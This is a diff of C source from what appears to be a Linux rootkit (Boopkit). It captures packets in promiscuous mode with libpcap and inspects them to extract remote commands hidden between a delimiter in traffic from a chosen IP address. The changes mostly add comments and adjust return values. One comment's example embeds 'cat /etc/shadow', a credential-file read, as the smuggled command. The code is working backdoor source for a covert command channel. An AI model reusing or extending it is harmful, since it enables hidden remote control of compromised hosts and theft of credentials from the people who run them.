@@ -34,12 +34,34 @@
 #include "common.h"
 // clang-format on
 
-// xcap_ring_buffer is the main thread safe packet ring buffer
+/**
+ * xcap_ring_buffer is the global ring buffer for dpi.c
+ */
 xcap_ip_packet *xcap_ring_buffer[XCAP_BUFFER_SIZE];
-int xcap_pos = 0;      // The position of the ring buffer to write
-int xcap_collect = 1;  // While (xcap_collect) { /* events */ }
+
+/**
+ * xcap_pos is the position of the stack iterator for
+ * the global xcap_ring_buffer.
+ */
+int xcap_pos = 0;
+
+/**
+ * runtime__xcap is the condition to continue to capture packets.
+ */
+int runtime__xcap = 1;
+
+/**
+ * dpi.c must be thread safe, this is the ring buffer mutex for mutating
+ * memory.
+ */
 pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
 
+/**
+ * xpack_dump is a debug method that is used to debug print
+ * a single packet.
+ *
+ * @param xpack the packet to debug
+ */
 void xpack_dump(xcap_ip_packet *xpack) {
   boopprintf("  -> Dumping Raw Xpack:\n");
   unsigned char *packet = xpack->packet;
@@ -49,6 +71,12 @@ void xpack_dump(xcap_ip_packet *xpack) {
   boopprintf("\n");
 }
 
+/**
+ * xcap_ring_buffer_dump is a debug method that can be used
+ * to debug all captured packets in a ring buffer.
+ *
+ * @param xbuff
+ */
 void xcap_ring_buffer_dump(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {
   boopprintf("  -> Dumping Raw xCap Buffer:\n");
   for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
@@ -61,6 +89,11 @@ void xcap_ring_buffer_dump(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {
   }
 }
 
+/**
+ * xcap_ring_buffer_free is used to free up a ring buffer.
+ *
+ * @param xbuff the ring buffer to free
+ */
 void xcap_ring_buffer_free(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {
   boopprintf("  -> Free Ring Buffer\n");
   for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
@@ -74,6 +107,11 @@ void xcap_ring_buffer_free(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {
   }
 }
 
+/**
+ * xcap_ring_buffer_init must be used to initalize a new ring buffer!
+ *
+ * @param xbuff is the ring buffer to initialize
+ */
 void xcap_ring_buffer_init(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {
   boopprintf("  -> Initalizing Ring Buffer\n");
   for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
@@ -86,6 +124,17 @@ void xcap_ring_buffer_init(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {
   }
 }
 
+/**
+ * rce_filter will filter an RCE value from in between
+ * the BOOPKIT_RCE_DELIMITER
+ *
+ * Such as:
+ *    raw:  X*x.x*Xcat /etc/shadowX*x.x*X
+ *    rce: /etc/shadow
+ * @param raw
+ * @param rce
+ * @return 1 success, 0 failure
+ */
 int rce_filter(char *raw, char *rce) {
   char *target = NULL;
   char *start, *end;
@@ -107,24 +156,32 @@ int rce_filter(char *raw, char *rce) {
   return 0;
 }
 
+/**
+ * xcap will listen on a specific Linux interface and capture
+ * raw network packets into a ring buffer at runtime.
+ *
+ * Run this in a unique thread to process packets on the backend.
+ * @param v_dev_name
+ * @return
+ */
 void *xcap(void *v_dev_name) {
-  char *dev_name = (char *)v_dev_name;
-  char filter_exp[] = "";  // TCP Dump filter
-  pcap_t *handle;
-  char errbuf[PCAP_ERRBUF_SIZE];
-  struct bpf_program fp;
-  bpf_u_int32 mask;
-  bpf_u_int32 net;
-  struct pcap_pkthdr header;
-  struct ether_header *ep;
-  unsigned short ether_type;
-  int cycle = 0;
-  const u_char *packet;
-  struct ip *iph;
-  boopprintf("  -> Starting xCap Interface : %s\n", dev_name);
+  char  *dev_name      = (char *)v_dev_name;
+  char  filter_exp[]   = "";
+  int   cycle          = 0;
 
-  // Initialize ring buffer
-  xcap_ring_buffer_init(xcap_ring_buffer);
+  pcap_t       *handle;
+  char         errbuf[PCAP_ERRBUF_SIZE];
+  bpf_u_int32  mask;
+  bpf_u_int32  net;
+
+  struct   bpf_program   fp;
+  struct   pcap_pkthdr   header;
+  struct   ether_header  *ep;
+  unsigned short         ether_type;
+  const    u_char        *packet;
+  struct   ip            *iph;
+
+  boopprintf("  -> Starting xCap Interface : %s\n", dev_name);
 
   if (pcap_lookupnet(dev_name, &net, &mask, errbuf) == -1) {
     boopprintf("Couldn't get netmask for device %s: %s\n", dev_name, errbuf);
@@ -132,7 +189,6 @@ void *xcap(void *v_dev_name) {
     mask = 0;
   }
 
-  // Open the session in promiscuous mode
   handle = pcap_open_live(dev_name, BUFSIZ, 1, 1000, errbuf);
   if (handle == NULL) {
     boopprintf("Couldn't open device %s: %s\n", dev_name, errbuf);
@@ -150,10 +206,10 @@ void *xcap(void *v_dev_name) {
     return NULL;
   }
 
+  xcap_ring_buffer_init(xcap_ring_buffer);
   boopprintf("  -> xCap RingBuffer Started : %s\n", dev_name);
 
-  // Capture network packets!
-  while (xcap_collect) {
+  while (runtime__xcap) {
     packet = pcap_next(handle, &header);
     ep = (struct ether_header *)packet;
     ether_type = ntohs(ep->ether_type);
@@ -176,7 +232,7 @@ void *xcap(void *v_dev_name) {
       pthread_mutex_unlock(&lock);
     }
 
-    // Xcap Packet Ring Buffer
+    // Write a new xpack to the ring buffer
     struct xcap_ip_packet *xpack = malloc(sizeof(xcap_ip_packet));
     xpack->packet = malloc(header.len);
     xpack->iph = malloc(sizeof(struct ip));
@@ -196,7 +252,13 @@ void *xcap(void *v_dev_name) {
   return NULL;
 }
 
-// snapshot is thread safe
+/**
+ * snapshot will effectively lock the global xcap_ring_buffer and take a
+ * snapshot of the packets in memory.
+ *
+ * @param snap a fresh copy of the memory when the snapshot was taken.
+ * @return 1 success
+ */
 int snapshot(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
   boopprintf("  -> Taking snapshot of network traffic.\n");
   pthread_mutex_lock(&lock);
@@ -224,37 +286,39 @@ int snapshot(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
     snap[i] = to;
   }
   pthread_mutex_unlock(&lock);
-
-  boopprintf("  -> Snapshot complete!\n");
-  return 0;
+  return 1;
 }
 
-// xcaprce is the main "interface" for pulling an RCE
-// out of the kernel.
-//
-// Different implementations may exist, for the first example
-// we are just using pcap.h
+/**
+ * xcaprce is used to look for an RCE in the ring buffer.
+ *
+ * @param search is the IP address to filter packets on (perfomance)
+ * @param rce is the RCE to execute, as filtered as possible
+ * @return
+ */
 int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
-  sleep(1);  // Wait for the kernel to catch up
+  sleep(1);  // Wait for the kernel to catch up :)
   boopprintf("  -> Search xCap Ring Buffer: %s\n", search);
   xcap_ip_packet *snap[XCAP_BUFFER_SIZE];
   xcap_ring_buffer_init(snap);
-  snapshot(snap);  // Thread safe snapshot of the ring buffer!
+  snapshot(snap);
+
+  // Search
   for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
     struct xcap_ip_packet *xpack;
     xpack = snap[i];
     if (!xpack->captured) {
-      continue;  // Ignore non captured packets in the buffer
+      continue;
     }
     char *xpack_saddr = inet_ntoa(xpack->iph->ip_src);
 
     char *ret = strstr(search, xpack_saddr);
     if (!ret) {
-      continue;  // Ignore packets not from our search!
+      continue;  // Filter packets not from our IP address
     }
 
+    // Begin DPI
     unsigned char *packet = xpack->packet;
-    // DPI for our RCE
     char *rce_sub;
     rce_sub = memmem(packet, xpack->header->caplen, BOOPKIT_RCE_DELIMITER,
                      strlen(BOOPKIT_RCE_DELIMITER));
@@ -262,28 +326,21 @@ int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
       boopprintf("  -> Found RCE xCap!\n");
       int found;
       found = rce_filter(rce_sub, rce);
-      if (found) {
-        // xpack_dump(xpack);
-        xcap_ring_buffer_free(snap);
+      // Flush the snapshot
+      xcap_ring_buffer_free(snap);
 
-        // Flush the main ring buffer
-        xcap_ring_buffer_free(xcap_ring_buffer);
-        xcap_ring_buffer_init(xcap_ring_buffer);
-        return 0;  // Money, Success, Fame, Glamour
-      } else {
-        boopprintf("  -> [FILTER FAILURE] No RCE in xCap!\n");
-        // xcap_ring_buffer_dump(snap);
-        xcap_ring_buffer_free(snap);  // Flush snapshot after RCE
-         //xcap_ring_buffer_free(xcap_ring_buffer); // Flush ring buffer after
-        // RCE
+      // Flush the main ring buffer
+      xcap_ring_buffer_free(xcap_ring_buffer);
+      xcap_ring_buffer_init(xcap_ring_buffer);
+      if (found) {
         return 1;
+      } else {
+        boopprintf("  XX [FILTER FAILURE] No RCE in xCap!\n");
+        return 0;
       }
     }
   }
   boopprintf("  -> No RCE in xCap!\n");
-  // xcap_ring_buffer_dump(snap);
-  xcap_ring_buffer_free(snap);  // Flush snapshot after RCE
-  // xcap_ring_buffer_free(xcap_ring_buffer); // Flush ring buffer after RCE
-  return 1;
-  // return 0; // When we found our RCE!
+  xcap_ring_buffer_free(snap);
+  return 0;
 }
